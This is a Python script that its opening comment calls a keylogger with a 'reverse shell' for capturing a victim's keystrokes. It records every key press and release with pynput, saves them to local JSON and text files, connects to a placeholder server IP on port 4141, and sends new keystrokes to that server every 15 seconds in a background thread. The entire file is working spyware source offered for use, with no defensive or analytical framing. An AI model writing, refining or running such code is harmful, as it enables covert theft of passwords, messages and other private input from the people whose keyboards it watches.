#this is a keylogger equiped with reverse shell where the server recives the key logs genrated from victims keyboard
from pynput import keyboard
import json
import socket
import time
import threading

keylist= []
x = False
key_strokes = ""
connection = None
send_interval = 15  # Send data to server every 15 seconds
last_sent_index = 0  # Track the last index sent to server

def update_text_file(key):          #function to update the text file
    with open("keylog.txt", "w+") as key_stroke:
        key_stroke.write(key)

def update_json_file(keylist):   #function to update the json file
    with open("keylog.json", "wb") as key_log:
        key_list_bytes = json.dumps(keylist).encode()
        key_log.write(key_list_bytes)

def on_press(key):       #function to log key press
    global x , keylist
    if x == False:
        keylist.append({'pressed' : f'{key}'})
        x=True
    if x == True:
        keylist.append({'Held' : f'{key}'})
    update_json_file(keylist)

def on_release(key):         #function to log key release
    global x , keylist , key_strokes 
    keylist.append({'Released' : f'{key}'})
    if x == True:
        x = False
    update_json_file(keylist)

    key_strokes= key_strokes+str(key)
    update_text_file(str(key_strokes))


def connect_to_server(ip, port):        #function to connect to key_server
    global connection
    connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    while True:
        try:
            connection.connect((ip, port))
            print(f" [+] Connected to server at {'[ip]'}:{4141}")  #provide your server's ip and port
            break
        except ConnectionRefusedError:
            print(" [!] Connection refused, retrying in 5 seconds...")
            time.sleep(5)

def send_data_to_server(data):          #function to send data to server
    json_data = json.dumps(data)
    connection.send(json_data.encode('utf-8'))

def send_json_file_to_server(filename):         #function to send json file to server
    try:
        with open(filename, 'rb') as f:
            file_content = f.read()
            # Send file with metadata
            data = {
                'type': 'keylog_file',
                'filename': filename,
                'content': file_content.decode('utf-8')
            }
            send_data_to_server(data)
            print(f" [+] Successfully sent {filename} to server")
    except FileNotFoundError:
        print(f" [!] File {filename} not found")
    except Exception as e:
        print(f" [!] Error sending file: {str(e)}")

def send_new_keylog_data():        #function to send only new keylog data to server
    global keylist, last_sent_index
    try:
        if last_sent_index < len(keylist):
            # Get only the new data since last send
            new_data = keylist[last_sent_index:]
            data = {
                'type': 'keylog_file',
                'filename': 'keylog.json',
                'content': json.dumps(new_data)
            }
            send_data_to_server(data)
            last_sent_index = len(keylist)
            print(f" [+] Sent {len(new_data)} new keystroke(s) to server")
    except Exception as e:
        print(f" [!] Error sending new keylog data: {str(e)}")

def periodic_send():        #function to periodically send keylog data to server
    global keylist
    while True:
        try:
            time.sleep(send_interval)
            if keylist:
                send_new_keylog_data()
                print(f" [+] Keylog sync completed at {time.strftime('%Y-%m-%d %H:%M:%S')}")
        except Exception as e:
            print(f" [!] Error in periodic send: {str(e)}")


print(" [+] Running keylogger Successfully \n [!] Saving the keylogs in keylog.json and keylog.txt")
print(" [+] Establishing connection to server...")
connect_to_server('[ip]', 4141)  
print(" [+] Server connection established, starting keylogger...")

# Start periodic send in background thread
send_thread = threading.Thread(target=periodic_send, daemon=True)
send_thread.start()

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
